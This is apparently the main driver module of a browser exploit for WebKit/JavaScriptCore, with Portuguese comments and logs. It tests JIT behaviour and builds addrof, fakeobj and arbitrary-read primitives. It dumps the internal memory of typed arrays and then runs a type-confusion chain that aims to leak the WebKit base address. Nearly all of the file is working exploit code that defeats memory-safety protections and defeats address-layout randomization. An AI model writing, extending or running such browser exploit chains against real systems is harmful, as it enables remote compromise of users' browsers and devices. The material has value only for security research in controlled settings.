// js/main.mjs

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './script3/testArrayBufferVictimCrash.mjs';
import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs';
import { JSC_OFFSETS } from './config.mjs';
import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs';

// --- Local DOM Elements Management ---
const elementsCache = {};

function getElementById(id) {
    if (elementsCache[id] && document.body.contains(elementsCache[id])) {
        return elementsCache[id];
    }
    const element = document.getElementById(id);
    if (element) {
        elementsCache[id] = element;
    }
    return element;
}

// --- Local Logging Functionality ---
const outputDivId = 'output-advanced';

export const log = (message, type = 'info', funcName = '') => {
    const outputDiv = getElementById(outputDivId);
    if (!outputDiv) {
        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`);
        return;
    }
    try {
        const timestamp = `[${new Date().toLocaleTimeString()}]`;
        const prefix = funcName ? `[${funcName}] ` : '';
        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info';

        if (outputDiv.innerHTML.length > 600000) {
            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000);
            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart;
        }

        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    } catch (e) {
        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message);
        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
    }
};

// --- Local Pause Functionality ---
const SHORT_PAUSE = 50;
const MEDIUM_PAUSE = 500;
const LONG_PAUSE = 1000;

const PAUSE = async (ms = SHORT_PAUSE) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// --- JIT Behavior Test ---
async function testJITBehavior() {
    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);

    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}

// --- Teste Isolado da Primitiva addrof_core e fakeobj_core com objeto simples e DUMP DE MEMÓRIA (AGORA COM UINT8ARRAY) ---
async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump';
    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA de UINT8ARRAY ---`, 'test', FNAME);

    let addrof_success = false;
    let fakeobj_success = false;
    let rw_test_on_fakeobj_success = false;
    let structure_ptr_found = false;
    let contents_ptr_leaked = false;

    try {
        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
        initCoreAddrofFakeobjPrimitives();
        await pauseFn(SHORT_PAUSE);

        // --- Criar um Uint8Array para o dump e teste ---
        const DUMP_ARRAY_SIZE = 0x1000; // 4KB para ter um m_vector alocado no heap
        const test_uint8_array_to_dump = new Uint8Array(DUMP_ARRAY_SIZE);
        for (let i = 0; i < DUMP_ARRAY_SIZE; i++) {
            test_uint8_array_to_dump[i] = (i % 255); // Preencher com um padrão previsível
        }
        logFn(`Criado Uint8Array de teste para dump (tamanho ${DUMP_ARRAY_SIZE} bytes) e preenchido com padrão.`, 'info', FNAME);
        await pauseFn(SHORT_PAUSE);

        logFn(`Obtendo endereço do Uint8Array de teste para dump usando addrof_core...`, 'info', FNAME);
        const uint8_array_addr = addrof_core(test_uint8_array_to_dump);
        logFn(`Endereço retornado por addrof_core (untagged, do Uint8Array): ${uint8_array_addr.toString(true)}`, 'leak', FNAME);

        if (uint8_array_addr.equals(AdvancedInt64.Zero) || uint8_array_addr.equals(AdvancedInt64.NaNValue)) {
            logFn(`ERRO: addrof_core retornou endereço inválido para test_uint8_array_to_dump.`, 'error', FNAME);
            throw new Error("addrof_core returned invalid address for Uint8Array.");
        }
        addrof_success = true; // addrof funciona para Uint8Array

        // --- DUMP DE MEMÓRIA DO UINT8ARRAY ---
        logFn(`--- INICIANDO DUMP DE MEMÓRIA do Uint8Array em ${uint8_array_addr.toString(true)} ---`, 'subtest', FNAME);
        const DUMP_SIZE = 0x100; // Dump 256 bytes do início do Uint8Array
        let dump_log = `\n--- DUMP DO UINT8ARRAY EM ${uint8_array_addr.toString(true)} ---\n`;
        dump_log += `Offset    Hex (64-bit)       Decimal (Low) Hex (32-bit Low) Hex (32-bit High) Content Guess\n`;
        dump_log += `-------- -------------------- ------------- ------------------ ------------------ -------------------\n`;

        for (let offset = 0; offset < DUMP_SIZE; offset += 8) {
            try {
                const current_read_addr = uint8_array_addr.add(offset);
                const val = await arb_read(current_read_addr, 8); // Ler como AdvancedInt64
                let guess = "";

                if (isAdvancedInt64Object(val)) {
                    if (val.equals(AdvancedInt64.Zero)) {
                        guess = "Zero/Null";
                    } else if (val.high() === 0x7ff80000 && val.low() === 0) {
                        guess = "NaN (JS Empty)";
                    } else {
                        if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
                            guess = `*** JSCell Structure* PTR (expected 0x8) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) structure_ptr_found = true;
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET) {
                            guess = `*** ABView ASSOCIATED_ARRAYBUFFER PTR (expected 0x8) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) contents_ptr_leaked = true;
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET) {
                            guess = `*** ABView M_VECTOR PTR (expected 0x10) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) contents_ptr_leaked = true;
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET) {
                            guess = `ABView M_LENGTH (expected 0x18): ${val.low()}`;
                        } else if (val.low() === test_uint8_array_to_dump[offset]) { // Tentativa de ler dados brutos
                            guess = `Raw Data Byte (0x${test_uint8_array_to_dump[offset].toString(16)})`;
                        } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) {
                            const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
                            guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
                        } else {
                            guess = `Raw Value: ${val.toString(true)}`;
                        }
                    }
                } else {
                    guess = `Non-Int64 (Typeof: ${typeof val}): ${String(val)}`;
                }

                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ${val.toString(true).padStart(19, ' ')} ${String(val.low()).padStart(13, ' ')} 0x${val.low().toString(16).padStart(8,'0')} 0x${val.high().toString(16).padStart(8,'0')} ${guess}\n`;

            } catch (e_dump) {
                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ERROR in arb_read: ${e_dump.message}\n`;
                logFn(`[${FNAME}] ERRO durante dump no offset 0x${offset.toString(16)}: ${e_dump.message}`, 'error', FNAME);
            }
        }
        logFn(dump_log, 'leak', FNAME);
        logFn(`--- FIM DO DUMP DE MEMÓRIA ---`, 'subtest', FNAME);
        await pauseFn(LONG_PAUSE * 2);

        // --- Avaliar os ponteiros da Structure e Contents do Uint8Array ---
        logFn(`Avaliando resultados de leitura para Uint8Array...`, 'info', FNAME);

        // Tentar ler o ponteiro da Structure* do Uint8Array no offset esperado (0x8)
        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do Uint8Array...`, 'info', FNAME);
        const structure_ptr_uint8_array_addr = uint8_array_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_ptr_uint8_array_val = await arb_read(structure_ptr_uint8_array_addr, 8);
        logFn(`Valor lido no offset da Structure* do Uint8Array: ${structure_ptr_uint8_array_val.toString(true)}`, 'leak', FNAME);
        if (!structure_ptr_uint8_array_val.equals(AdvancedInt64.Zero) && !structure_ptr_uint8_array_val.equals(AdvancedInt64.NaNValue)) {
            logFn(`SUCESSO PARCIAL: Ponteiro da Structure* do Uint8Array NÃO É ZERO/NaN.`, 'good', FNAME);
            structure_ptr_found = true;
        } else {
            logFn(`ALERTA: Ponteiro da Structure* do Uint8Array LIDO COMO ZERO/NaN.`, 'warn', FNAME);
            structure_ptr_found = false;
        }

        // Tentar ler o ponteiro ASSOCIATED_ARRAYBUFFER_OFFSET (0x8) ou M_VECTOR_OFFSET (0x10) do Uint8Array
        logFn(`Tentando ler ASSOCIATED_ARRAYBUFFER_OFFSET (0x${JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET.toString(16)}) do Uint8Array...`, 'info', FNAME);
        const associated_arraybuffer_ptr_addr = uint8_array_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET);
        const associated_arraybuffer_ptr_val = await arb_read(associated_arraybuffer_ptr_addr, 8);
        logFn(`Valor lido do ASSOCIATED_ARRAYBUFFER_OFFSET: ${associated_arraybuffer_ptr_val.toString(true)}`, 'leak', FNAME);

        if (!associated_arraybuffer_ptr_val.equals(AdvancedInt64.Zero) && !associated_arraybuffer_ptr_val.equals(AdvancedInt64.NaNValue)) {
            logFn(`SUCESSO PARCIAL: Ponteiro ASSOCIATED_ARRAYBUFFER_OFFSET do Uint8Array NÃO É ZERO/NaN.`, 'good', FNAME);
            contents_ptr_leaked = true; // Confirma que um ponteiro de conteúdo foi lido.

            // Agora que temos o ponteiro para o ArrayBuffer subjacente, podemos tentar ler o conteúdo dele.
            // Para isso, precisamos do offset CONTENTS_IMPL_POINTER_OFFSET (0x10) DENTRO do ArrayBuffer.
            logFn(`Tentando ler CONTENTS_IMPL_POINTER_OFFSET (0x${JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET.toString(16)}) do ArrayBuffer (apontado por ASSOCIATED_ARRAYBUFFER_OFFSET)...`, 'info', FNAME);
            const contents_impl_ptr_from_arraybuffer_addr = associated_arraybuffer_ptr_val.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
            const contents_impl_ptr_val = await arb_read(contents_impl_ptr_from_arraybuffer_addr, 8);
            logFn(`Valor lido do CONTENTS_IMPL_POINTER_OFFSET do ArrayBuffer: ${contents_impl_ptr_val.toString(true)}`, 'leak', FNAME);

            if (!contents_impl_ptr_val.equals(AdvancedInt64.Zero) && !contents_impl_ptr_val.equals(AdvancedInt64.NaNValue)) {
                logFn(`SUCESSO CRÍTICO: Ponteiro CONTENTS_IMPL_POINTER_OFFSET do ArrayBuffer NÃO É ZERO/NaN! Este é o ponteiro para os dados reais do ArrayBuffer!`, 'vuln', FNAME);
                // Podemos usar esse ponteiro para verificar a leitura/escrita arbitrária de dados.
                // Tentar ler o primeiro byte do conteúdo real do ArrayBuffer
                logFn(`Verificando o primeiro byte do conteúdo real do ArrayBuffer (esperado ${toHex(test_uint8_array_to_dump[0])})...`, 'info', FNAME);
                const first_byte_val = await arb_read(contents_impl_ptr_val, 1);
                if (first_byte_val === test_uint8_array_to_dump[0]) {
                    logFn(`SUCESSO: Leitura de dados brutos do ArrayBuffer via arb_read CORRETA! (Valor: ${toHex(first_byte_val)})`, 'good', FNAME);
                } else {
                    logFn(`FALHA: Leitura de dados brutos do ArrayBuffer INCORRETA! Lido: ${toHex(first_byte_val)}, Esperado: ${toHex(test_uint8_array_to_dump[0])}.`, 'error', FNAME);
                }
            } else {
                logFn(`ALERTA: Ponteiro CONTENTS_IMPL_POINTER_OFFSET do ArrayBuffer LIDO COMO ZERO/NaN.`, 'warn', FNAME);
            }
        } else {
            logFn(`ALERTA: Ponteiro ASSOCIATED_ARRAYBUFFER_OFFSET do Uint8Array LIDO COMO ZERO/NaN.`, 'warn', FNAME);
        }

        // --- Verificação funcional de fakeobj_core (usando um objeto JS simples, como no teste anterior) ---
        logFn(`Realizando verificação funcional de addrof/fakeobj_core com um objeto JS simples (re-confirmando).`, 'subtest', FNAME);
        const test_object_simple = { prop_a: 0xAAAA, prop_b: 0xBBBB };
        const test_object_simple_addr = addrof_core(test_object_simple);
        const faked_object_simple = fakeobj_core(test_object_simple_addr);
        if (faked_object_simple && typeof faked_object_simple === 'object') {
            fakeobj_success = true;
            faked_object_simple.prop_a = 0xDEADC0DE;
            if (test_object_simple.prop_a === 0xDEADC0DE) {
                logFn(`SUCESSO: Leitura/Escrita via fakeobj para objeto JS simples confirmada.`, 'good', FNAME);
                rw_test_on_fakeobj_success = true;
            } else {
                logFn(`FALHA: Leitura/Escrita via fakeobj para objeto JS simples falhou.`, 'error', FNAME);
            }
        } else {
            logFn(`FALHA: Criação de fakeobj para objeto JS simples falhou.`, 'error', FNAME);
        }
        await pauseFn(SHORT_PAUSE);


    } catch (e) {
        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core e dump de memória: ${e.message}\n${e.stack || ''}`, 'critical', FNAME);
        addrof_success = false;
        fakeobj_success = false;
        rw_test_on_fakeobj_success = false;
        structure_ptr_found = false;
        contents_ptr_leaked = false;
    } finally {
        logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, 'test', FNAME);
        logFn(`Resultados: Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj (obj simples): ${rw_test_on_fakeobj_success}, Structure* Ponteiro Encontrado (Uint8Array, no offset 0x8): ${structure_ptr_found}, Conteúdo/m_vector Ponteiro Vazado (Uint8Array): ${contents_ptr_leaked}`, 'info', FNAME);
    }
    // Retorna true apenas se as primitivas base e o vazamento do ponteiro de conteúdo do AB funcionarem
    return addrof_success && fakeobj_success && rw_test_on_fakeobj_success && contents_ptr_leaked;
}


// --- Main Heisenbug Reproduction Strategy ---
async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43";
    log(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        log(`  RUNNER R43(L): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        log(`  RUNNER R43(L): Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        log(`  RUNNER R43(L): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        log(`  RUNNER R43(L): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            log(`  RUNNER R43(L): Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            log(`  RUNNER R43(L): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkitBaseAddress || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}_R43L: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}_R43L: Addrof OK, WebKitLeak Fail`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${module_name_for_title}_R43L: TC OK, Addrof/WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}_R43L: No TC Confirmed`;
        }
    } else {
        document.title = `${module_name_for_title}_R43L: Invalid Result Obj`;
    }
    log(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE(MEDIUM_PAUSE);
    log(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}


// --- Initialization Logic ---
function initializeAndRunTest() {
    const runBtn = getElementById('runIsolatedTestBtn');
    const outputDiv = getElementById('output-advanced');

    // Set the log function in utils.mjs so core_exploit.mjs can use it
    setLogFunction(log);

    if (!outputDiv) {
        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page.");
    }

    if (runBtn) {
        runBtn.addEventListener('click', async () => {
            if (runBtn.disabled) return;
            runBtn.disabled = true;

            if (outputDiv) {
                outputDiv.innerHTML = ''; // Clear previous logs
            }
            console.log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...");
            log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...", 'test');

            try {
                // Execute JIT test first
                await testJITBehavior();
                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log

                // NOVO: Teste isolado das primitivas addrof_core e fakeobj_core com dump de memória
                // Removido o argumento 'isAdvancedInt64Object' daqui, pois ele não é mais necessário
                // em testIsolatedAddrofFakeobjCoreAndDump, graças à importação corrigida em core_exploit.mjs.
                const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump(log, PAUSE, JSC_OFFSETS);
                if (!addrof_fakeobj_dump_test_passed) {
                    log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
                    runBtn.disabled = false;
                    return;
                }
                log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória concluído com sucesso. Prosseguindo para a cadeia principal.", 'good');
                await PAUSE(LONG_PAUSE * 2); // Pausa mais longa para revisar logs do dump

                // Then run the main exploit strategy
                await runHeisenbugReproStrategy_TypedArrayVictim_R43();
            } catch (e) {
                console.error("Critical error during isolated test execution:", e);
                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical');
            } finally {
                console.log("Isolated test concluded.");
                log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test');
                runBtn.disabled = false;
                if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
                }
            }
        });
    } else {
        console.error("Button 'runIsolatedTestBtn' not found.");
    }
}

// Ensure DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAndRunTest);
} else {
    initializeAndRunTest();
}
